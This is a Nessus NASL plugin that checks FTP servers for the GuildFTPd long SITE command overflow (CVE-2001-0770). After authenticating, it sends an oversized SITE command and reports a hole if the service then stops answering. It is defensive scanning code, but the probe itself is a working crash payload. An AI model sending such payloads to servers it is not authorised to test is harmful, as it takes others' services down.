#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
#  Ref: andreas.junestam@defcom.com
#
#  This script is released under the GNU GPL v2
#


include("compat.inc");

if(description)
{
 script_id(15851);
 script_bugtraq_id(2782);
 script_cve_id("CVE-2001-0770");
 script_xref(name:"OSVDB", value:"5540");
 script_version ("$Revision: 1.9 $");

 script_name(english:"GuildFTPd Long SITE Command Overflow");
 script_summary(english:"Sends an oversized SITE command to the remote server");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is vulnerable to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote ftp server seems to be vulnerable to a denial of service
attack through the SITE command when handling specially long requests. 
An attacker can exploit this flaw in order to crash the affected
service or possibly execute arbitrary code." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-05/0254.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_category(ACT_DENIAL);
  
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# da code
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 banner = get_ftp_banner(port:port);
 if ( ! banner || "GuildFTP" >!< banner ) exit(0);
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");

 if(login)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  if(ftp_authenticate(socket:soc, user:login,pass:password))
  {
   data = string("SITE ", crap(262), "\r\n");
   send(socket:soc, data:data);
   reply = ftp_recv_line(socket:soc);
   sleep(1);
   soc2 = open_sock_tcp(port);
   if(!soc2)
   {
     security_hole(port);
   }
   close(soc2);
   data = string("QUIT\n");
   send(socket:soc, data:data);
  }
  close(soc);
 }
}
